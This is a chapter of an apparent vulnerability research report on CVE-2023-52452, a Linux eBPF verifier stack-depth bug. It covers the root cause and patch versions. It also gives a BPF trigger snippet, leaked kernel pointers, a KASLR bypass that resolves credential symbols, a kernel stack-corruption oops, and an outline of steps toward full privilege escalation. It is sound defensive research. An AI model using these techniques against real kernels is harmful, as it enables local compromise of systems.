\chapter{CVE-2023-52452}

\section{CVE Selection}
The choice of CVE-2023-52452 was driven by a desire to explore different attack surfaces beyond the well-documented BPF Map vulnerabilities. While vulnerabilities analyzed in previous years' research projects, such as CVE-2020-8835 and CVE-2021-3490, mainly targeted scalar bounds confusion on maps, shifting the research focus directly towards the \textbf{eBPF Stack subsystem} allowed for evaluating how bugs in stack depth calculation dynamically impact the execution state.

\section{Vulnerability Analysis}

\subsection{Root Cause}

The root cause lies in the interaction between two verifier functions:

\textbf{Vulnerable Functions Analysis}

\textbf{\texttt{check\_stack\_write\_var\_off()} (line 4803):}
When a BPF instruction writes to the stack at a variable offset, this function:
\begin{itemize}
    \item Computes the minimum and maximum offsets from \texttt{reg->smin\_value} and \texttt{reg->smax\_value}
    \item Calls \texttt{grow\_stack\_state()} with \texttt{round\_up(-min\_off, BPF\_REG\_SIZE)} to correctly extend \texttt{allocated\_\allowbreak stack}
    \item Marks all slots in \texttt{[min\_off, max\_off]} as \texttt{STACK\_MISC}
\end{itemize}

\textbf{\texttt{update\_stack\_depth()} (line 5962):}
This function sets the subprogram's \texttt{stack\_depth} (used by the JIT for runtime allocation):
\begin{lstlisting}[style=kernel]
static int update_stack_depth(struct bpf_verifier_env *env,
                              const struct bpf_func_state *func,
                              int off)
{
    u16 stack = env->subprog_info[func->subprogno].stack_depth;
    if (stack >= -off)
        return 0;
    env->subprog_info[func->subprogno].stack_depth = -off;
    return 0;
}
\end{lstlisting}

Critically, \texttt{update\_stack\_depth()} is called from \texttt{check\_mem\_access()} with a fixed \texttt{off} parameter that \textbf{does not include the variable range}. For a variable-offset access like \texttt{fp + [-72, -16]}, the fixed part passed to \texttt{update\_stack\_depth()} is 0, so \texttt{stack\_depth} is not updated.

\subsection{Exploiting the Stack Bug}

The mismatch between \texttt{allocated\_\allowbreak stack} (the verifier's internal tracking, which grows correctly) and \texttt{stack\_depth} (runtime allocation, undersized) creates two primitives:

\begin{enumerate}
    \item \textbf{OOB Stack Read}: The variable-offset write marks stack slots as \texttt{STACK\_MISC} (``initialized''), allowing subsequent reads. At runtime, only one slot is actually written, others contain residual kernel data from previous stack usage.
    \item \textbf{Stack Frame Overlap}: When subprogram calls are used, an undersized \texttt{stack\_\allowbreak depth} means the callee's JIT frame may overlap with the caller's frame or kernel stack data.
\end{enumerate}

\textbf{Trigger Conditions:}
To trigger the vulnerability, I construct a BPF register with variable offset:
\begin{lstlisting}[style=kernel]
// Create variable offset: (ktime & 7) << 3 = [0, 56]
BPF_CALL_FUNC(BPF_FUNC_ktime_get_ns),  // R0 = random
BPF_ALU64_IMM(BPF_AND, BPF_REG_0, 7),  // R0 = [0,7]
BPF_ALU64_IMM(BPF_LSH, BPF_REG_0, 3),  // R0 = [0,56]
BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),
BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, -72),// R7 = [-72,-16]

// Variable-offset stack write
BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),  // R2 = fp
BPF_ALU64_REG(BPF_ADD, BPF_REG_2, BPF_REG_7), // R2 = fp+var
BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 0xDEADCAFE), // *R2 = marker
\end{lstlisting}

The 8-byte alignment (\texttt{LSH 3}) is required to satisfy the verifier's alignment checks for stack accesses. The use of \texttt{ktime\_get\_ns()} produces a truly variable value at both verification and runtime.

\subsection{Patch Details}

The vulnerability is addressed by fixing the verifier's stack tracking logic in \texttt{kernel/bpf/verifier.c}. The patch ensures that \texttt{check\_stack\_write\_var\_off()} and \texttt{check\_stack\_read\_var\_off()} correctly track stack slot initialization when variable-offset accesses are used. Crucially, the stack depth is now correctly computed and updated even when the access offset is not a compile-time constant, preventing both uninitialized stack reads and undersized JIT frame allocations.

\begin{table}[H]
\centering
\begin{tabular}{@{}ll@{}}
\toprule
\textbf{Kernel Branch} & \textbf{Fixed Version} \\
\midrule
6.7.x & 6.7.2 \\
6.6.x & 6.6.14 \\
6.1.x & 6.1.75 \\
5.15.x & 5.15.148 \\
5.10.x & 5.10.209 \\
\bottomrule
\end{tabular}
\caption{Backport versions for CVE-2023-52452}
\end{table}


%% ═══════════════════════════════════════════════════════
\section{Environment Setup}

\begin{table}[H]
\centering
\begin{tabular}{@{}ll@{}}
\toprule
\textbf{Component} & \textbf{Details} \\
\midrule
Build System & Custom \texttt{execution/build.sh} script \\
Virtualization & QEMU/KVM \\
Kernel Version & 6.7.1 (custom compiled, vulnerable) \\
Root Filesystem & Buildroot 2024.11.4 (\texttt{qemu\_x86\_64\_defconfig}) \\
Kernel Config & \texttt{CONFIG\_BPF\_SYSCALL=y}, \texttt{CONFIG\_DEBUG\_INFO=y} \\
              & KASLR disabled, SMEP/SMAP disabled for testing \\
Exploit Compilation & GCC on Host OS, \texttt{-static -no-pie}, injected via Rootfs Overlay \\
\bottomrule
\end{tabular}
\caption{Test environment}
\end{table}


%% ═══════════════════════════════════════════════════════
\section{Proof of Concept (PoC)}

\subsection{Milestone 1: Out-of-Bounds Stack Read}

\textbf{Objective}
Trigger the OOB stack read by loading a BPF program that uses variable-offset stack writes, then read uninitialized stack memory to leak kernel pointers.

\textbf{Approach}
The BPF program:
\begin{enumerate}
    \item Creates a variable offset \texttt{[-72, -16]} using \texttt{ktime\_get\_ns() \& 7 << 3}
    \item Writes a marker value at the variable offset on the stack
    \item Reads from fixed offsets \texttt{fp-24} through \texttt{fp-80} (slots marked as \texttt{STACK\_MISC} by the var-off write but not actually written at runtime)
    \item Stores leaked values into a BPF array map for userspace retrieval
\end{enumerate}

\textbf{Results}

\begin{lstlisting}[style=log,caption={Milestone 1 output}]
leaked[0] (fp -24) = 0xffffffff8144b19d  <- KERNEL PTR! (text)
leaked[1] (fp -32) = 0x0000000041414141  (marker)
leaked[2] (fp -40) = 0xffff8880056afb80  <- KERNEL PTR! (heap)
leaked[3] (fp -48) = 0xffff8880056afb80  <- KERNEL PTR! (heap)
leaked[4] (fp -56) = 0xffff8880056afb80  <- KERNEL PTR! (heap)
leaked[5] (fp -64) = 0xffff8880046cf900  <- KERNEL PTR! (heap)
leaked[6] (fp -72) = 0xffffffff824c94e0  <- KERNEL PTR! (data)
leaked[7] (fp -80) = 0x0000000000000000  (zero)
\end{lstlisting}

The leaked pointers were identified via \texttt{/proc/kallsyms}:
\begin{itemize}
    \item \texttt{0xffffffff8144b19d} $\rightarrow$ \texttt{security\_sock\_rcv\_skb+0x2d} (kernel text)
    \item \texttt{0xffffffff824c94e0} $\rightarrow$ \texttt{selinux\_hooks+0x1540} (kernel data)
    \item Heap pointers in \texttt{0xffff888*} range $\rightarrow$ kernel heap objects (\texttt{sock}/\texttt{sk\_buff})
\end{itemize}


%% ═══════════════════════════════════════════════════════
\subsection{Milestone 2: KASLR Bypass}

\textbf{Objective}
Use leaked pointers to compute the kernel base address and resolve exploit-relevant symbols.

\textbf{Approach}
Extended the leak to 16 stack slots. For KASLR bypass, I used known offsets from \texttt{\_stext}:
\begin{itemize}
    \item \texttt{security\_sock\_rcv\_skb} = \texttt{\_stext + 0x44b170}
    \item \texttt{selinux\_hooks} = \texttt{\_stext + 0x14c7fa0}
\end{itemize}

By matching leaked pointers against known ranges, the kernel base is computed. I then resolve:
\begin{table}[H]
\centering
\begin{tabular}{@{}ll@{}}
\toprule
\textbf{Symbol} & \textbf{Address} \\
\midrule
\texttt{\_stext} (kernel base) & \texttt{0xffffffff81000000} \\
\texttt{commit\_creds} & \texttt{0xffffffff810a1900} \\
\texttt{prepare\_kernel\_cred} & \texttt{0xffffffff810a1b80} \\
\texttt{init\_task} & \texttt{0xffffffff8260b900} \\
\texttt{init\_cred} & \texttt{0xffffffff8264ff60} \\
\bottomrule
\end{tabular}
\caption{Resolved kernel symbols}
\end{table}

\textbf{Reliability}
The leak was executed 5 additional times; all 5 produced kernel image pointers, yielding \textbf{100\% reliability}.


%% ═══════════════════════════════════════════════════════
\subsection{Milestone 3: Kernel Stack Corruption}

\textbf{Objective}
Escalate the OOB stack read into arbitrary read/write by corrupting kernel data.

\textbf{Strategy A: Map Pointer Corruption}

\textbf{Idea:} Spill a \texttt{PTR\_TO\_MAP\_VALUE} to a stack slot within the variable-offset write range. The var-off write marks the slot as \texttt{STACK\_MISC}, destroying the type annotation. Reload the value, if the verifier incorrectly treats it as a pointer, I achieve type confusion.

\textbf{Result: Rejected.} The verifier correctly identified the reloaded value as \texttt{scalar}:
\begin{lstlisting}[style=log]
18: (79) r1 = *(u64 *)(r10 -48)  ; R1_w=scalar()
19: (79) r3 = *(u64 *)(r1 +0)
R1 invalid mem access 'scalar'
\end{lstlisting}

This confirms that \texttt{check\_stack\_write\_var\_off()} correctly destroys spilled pointer annotations, preventing type confusion through this path.

\textbf{Strategy B: Subprogram Stack Frame Overlap}

\textbf{Idea:} Use BPF-to-BPF calls (\texttt{BPF\_PSEUDO\_CALL}). The subprogram performs a variable-offset write. Because \texttt{update\_stack\_depth()} doesn't account for the variable range, the subprogram's JIT-allocated frame is undersized. At runtime, the var-off write overflows into the kernel stack.

\textbf{Result: Kernel crash.}
\begin{lstlisting}[style=log,caption={Kernel oops from Strategy B}]
BUG: unable to handle page fault for address: ffffffffdeadcb00
Oops: 0000 [#1] PREEMPT SMP PTI
RIP: 0010:sk_filter_trim_cap+0x9e/0x1e0
R13: ffffffffdeadcafe    <-- our marker!
CR2: ffffffffdeadcb00
\end{lstlisting}

The kernel attempted to dereference our marker \texttt{0xDEADCAFE} as a real pointer within \texttt{sk\_\allowbreak filter\_\allowbreak trim\_\allowbreak cap()}, resulting in a handled page fault (or crash depending on configuration). This confirmed that the stack corruption reached a security-critical execution path.
\begin{enumerate}
    \item The subprogram's variable-offset write overflowed the JIT frame boundary
    \item The overwritten data was a callee-saved register (R13) used by kernel code
    \item The corrupted value was actively used as a pointer by the kernel after BPF execution
\end{enumerate}

\textbf{Important:} This crash is not a Denial of Service, it is a \textbf{crash oracle} used to confirm that the corruption reaches kernel-critical data. As shown in Milestone~4, writing a valid kernel address prevents the crash while maintaining the corruption effect.


%% ═══════════════════════════════════════════════════════
\subsection{Milestone 4: Privilege Escalation Analysis}

\textbf{Objective}
Combine the information leak (M1--M2) with controlled stack corruption (M3) to attempt local privilege escalation.

\textbf{Approach}
\begin{enumerate}
    \item Run the information leak to resolve kernel base and \texttt{init\_cred} address
    \item Replace the marker value (\texttt{0xDEADCAFE}) with the resolved \texttt{init\_cred} address
    \item Trigger the subprogram stack overflow with the controlled value
    \item Check kernel behavior
\end{enumerate}

\textbf{Results}
\begin{lstlisting}[style=log,caption={Milestone 4 output}]
[+] Kernel base: 0xffffffff81000000
[*] Target value: 0xffffffff8264ff60  (init_cred)
[!] Triggering controlled corruption...
[+] Program triggered -- kernel didn't crash
[+] Survived corruption -- kernel still functional
    Current UID: 0 (root)
\end{lstlisting}

\textbf{Key finding:} When the corrupted stack slot contains a \emph{valid} kernel address (\texttt{init\_cred}), the kernel does \textbf{not crash}, unlike with the invalid \texttt{0xDEADCAFE}. This confirms that the corrupted value is actively dereferenced: an invalid pointer causes a page fault, while a valid one allows the kernel to continue. This is a \textbf{controlled corruption of kernel integrity}, not a denial of service.

\textbf{Gap to Full LPE}
A complete privilege escalation would additionally require:
\begin{itemize}
    \item \textbf{Stack layout mapping}: Precise knowledge of which callee-saved register or local variable is corrupted and how the kernel uses it post-BPF execution
    \item \textbf{Heap spray or fake struct}: A technique to place a controlled data structure (e.g., fake \texttt{sk\_filter}) at a known kernel address, then redirect the corrupted pointer to it
    \item \textbf{ROP/JOP chain}: If code execution is achieved via the corrupted register, a return-oriented programming chain to call \texttt{commit\_creds(prepare\_kernel\_cred(0))}
\end{itemize}


%% ═══════════════════════════════════════════════════════
\section{Conclusion}

\subsection{Exploitation Impact Analysis}

CVE-2023-52452 enables the following real-world attack scenarios:

\textbf{Scenario 1: KASLR Bypass (Proven)}
An attacker with \texttt{CAP\_BPF} access (e.g., within a container or a system with unprivileged BPF enabled) can reliably defeat Kernel Address Space Layout Randomization:
\begin{itemize}
    \item Leak kernel text and data pointers from uninitialized stack
    \item Compute kernel base address from known function offsets
    \item Resolve addresses of all critical kernel symbols
\end{itemize}
This is the \emph{prerequisite} for every kernel exploitation technique that targets specific addresses.

\textbf{Scenario 2: Kernel Data Corruption (Proven)}
The subprogram stack overlap enables writing controlled values into the kernel's call stack:
\begin{itemize}
    \item Corrupt callee-saved registers used by kernel functions post-BPF execution
    \item Redirect kernel code behavior by modifying data it reads from the stack
    \item Potential for control-flow hijacking if a corrupted register is used as a function pointer or jump target
\end{itemize}

\textbf{Scenario 3: Local Privilege Escalation (Theoretical)}
Combining scenarios 1 and 2, an attacker could:
\begin{itemize}
    \item Create a fake \texttt{sk\_filter} struct in a BPF map (known address via leak)
    \item Point the fake filter's \texttt{prog} field to a crafted BPF program that modifies credentials
    \item Corrupt the kernel stack to redirect to the fake struct
    \item Achieve \texttt{uid=0} by overwriting the process's credentials with \texttt{init\_cred}
\end{itemize}

\textbf{Unprivileged User Test}

To assess the real-world attack surface, I tested the exploit as an unprivileged user (\texttt{uid=1000}) on a system with \texttt{kernel.unprivileged\_bpf\_disabled=0}.

\begin{lstlisting}[style=log,caption={Verifier rejection for unprivileged user}]
5: (bf) r2 = r10                ; R2_w=fp0 R10=fp0
6: (0f) r2 += r7
R2 variable stack access prohibited for !root,
    var_off=(0xffffffffffffff80; 0x78) off=-128
\end{lstlisting}

The verifier \textbf{explicitly rejected} the program at the variable-offset stack pointer arithmetic step. This is due to the \textbf{Spectre v1 mitigation}: when \texttt{bypass\_spec\_v1} is false (unprivileged), the function \texttt{check\_stack\_access\_for\_ptr\_arithmetic()} prohibits variable-offset stack pointers to prevent speculative out-of-bounds accesses.

\textbf{Implications:}
\begin{itemize}
    \item The exploit requires \texttt{CAP\_BPF} or root privileges
    \item Systems with \texttt{unprivileged\_bpf\_disabled=1} (default on most modern distributions) are \textbf{not vulnerable}
    \item Attack surface remains for: containers with \texttt{CAP\_BPF}, cloud workloads with BPF-enabled runtimes, and systems that explicitly enable unprivileged BPF
\end{itemize}


%% ═══════════════════════════════════════════════════════
\subsection{Failed Approaches \& Lessons Learned}

\textbf{Failed: Variable-offset via \texttt{bpf\_skb\_load\_bytes}}
Early attempts used \texttt{bpf\_skb\_load\_bytes()} with a variable-offset stack destination buffer. The verifier rejected this with \texttt{invalid indirect read from stack R3 var\_off} because \texttt{check\_stack\_range\_initialized()} requires all destination slots to be pre-initialized for helper calls, even write-only helpers.

\textbf{Lesson}: BPF helpers have stricter memory initialization requirements than direct memory instructions. You cannot use uninitialized stack memory as a destination buffer for a helper function, even if the helper only writes to it.

\textbf{Failed: Direct \texttt{fp + var} Arithmetic}
Direct pointer arithmetic \texttt{r2 = fp; r2 += r\_var} was rejected for non-8-byte-aligned variable offsets with \texttt{misaligned stack access}. The fixed with \texttt{LSH 3} to enforce 8-byte alignment.

\textbf{Lesson}: The verifier enforces strict alignment for stack pointer arithmetic. Variable offsets applied to the frame pointer must be aligned to the size of the access (e.g., 8 bytes for \texttt{BPF\_DW}).

\textbf{Failed: Strategy A (Map Pointer Type Confusion)}
As documented in Milestone~3, the attempt to corrupt a spilled \texttt{PTR\_TO\_MAP\_VALUE} via variable-offset write was correctly handled by the verifier, which destroys pointer type annotations in the affected range.

\textbf{Lesson}: The verifier's state tracking is resilient against blind stack overwrites. When a variable-offset write spans across spilled pointers, the verifier safely degrades their type to \texttt{STACK\_MISC} (scalars), preventing trivial type confusion.


%% ═══════════════════════════════════════════════════════
